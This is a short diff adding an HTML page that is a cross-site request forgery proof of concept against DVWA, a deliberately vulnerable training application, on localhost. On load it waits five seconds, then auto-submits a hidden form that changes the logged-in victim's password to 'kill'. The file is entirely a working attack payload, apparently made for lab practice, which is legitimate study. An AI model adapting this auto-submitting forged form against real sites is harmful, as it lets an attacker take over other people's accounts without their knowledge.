@@ -1,0 +1,13 @@
+<html>
+    <body onload="setTimeout(function() { document.redir.submit() }, 5000)">
+        <form name="redir" method="GET" action="http://localhost/dvwa/vulnerabilities/csrf/">
+            <input type="hidden" name="password_new" value="kill">
+            <input type="hidden" name="password_conf" value="kill">
+            <input type="hidden" name="Change" value="Change">
+            <input type="submit">
+        </form>
+        <script type="text/javascript">
+            document.myform.submit();
+        </script>
+    </body>
+</html>
